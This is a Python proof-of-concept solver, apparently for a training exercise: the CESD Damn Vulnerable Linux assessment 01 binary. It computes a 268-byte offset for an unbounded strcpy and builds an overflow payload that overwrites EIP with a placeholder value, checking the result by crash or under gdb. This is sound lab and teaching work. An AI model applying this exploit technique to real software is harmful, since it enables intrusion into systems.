#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Solveur / PoC — cesd_dvl_assessment_1 (zero, « 01_exploitme01 »).

Ce n'est pas un keygen : c'est l'assessment 01 de la certification CESD
(Damn Vulnerable Linux). main() fait un strcpy(buf, argv[1]) sans borne,
avec buf = [ebp-0x108]. On contrôle donc EIP a partir d'un offset fixe.

  buf a ebp-0x108  → distance jusqu'a l'adresse de retour sauvegardee :
      0x108 (buffer) + 4 (ebp sauvegarde) = 0x10c = 268 octets
  octets 268..271 = nouvelle valeur d'EIP.

Usage :
  ./crackmes-de-cesd_dvl_assessment_1-solve.py            # offset + payload
  ./crackmes-de-cesd_dvl_assessment_1-solve.py --run BIN  # execute BIN (SIGSEGV)
  ./crackmes-de-cesd_dvl_assessment_1-solve.py --gdb BIN  # verifie EIP sous gdb
"""
import sys, subprocess, struct, os, tempfile, zipfile

OFFSET = 268                       # buf(0x108) + ebp sauvegarde(4)
NEW_EIP = 0x42424242               # "BBBB" — demonstration du controle d'EIP


def payload(eip=NEW_EIP):
    return b"A" * OFFSET + struct.pack("<I", eip)


def extract_elf():
    here = os.path.dirname(os.path.abspath(__file__))
    zpath = os.path.join(here, "..", "original", "CESD_Assessment01.zip")
    tmp = tempfile.mkdtemp(prefix="cesd01_")
    with zipfile.ZipFile(zpath) as z:
        z.extract("01_exploitme01", tmp)
    p = os.path.join(tmp, "01_exploitme01")
    os.chmod(p, 0o755)
    return p


def main():
    args = sys.argv[1:]
    if not args:
        p = payload()
        print("offset EIP        : %d" % OFFSET)
        print("EIP cible         : 0x%08x" % NEW_EIP)
        print("payload (len=%d) : %r...%r" % (len(p), p[:16], p[-4:]))
        return
    if args[0] == "--run":
        binp = args[1] if len(args) > 1 else extract_elf()
        r = subprocess.run([binp, payload().decode("latin1")])
        rc = r.returncode
        crashed = rc in (139, -11)       # 128+11 ou -SIGSEGV selon le shell
        print("return code = %d (SIGSEGV attendu)" % rc)
        sys.exit(0 if crashed else 1)
    if args[0] == "--gdb":
        binp = args[1] if len(args) > 1 else extract_elf()
        arg = "A" * OFFSET + "BBBB"
        script = "set pagination off\nrun %s\ninfo registers eip\nquit\n" % arg
        with tempfile.NamedTemporaryFile("w", suffix=".gdb", delete=False) as f:
            f.write(script)
            gs = f.name
        out = subprocess.run(["gdb", "-q", "-batch", "-x", gs, binp],
                             capture_output=True, text=True)
        print(out.stdout)
        ok = "0x42424242" in out.stdout
        print("EIP controle :", "OUI" if ok else "non")
        sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
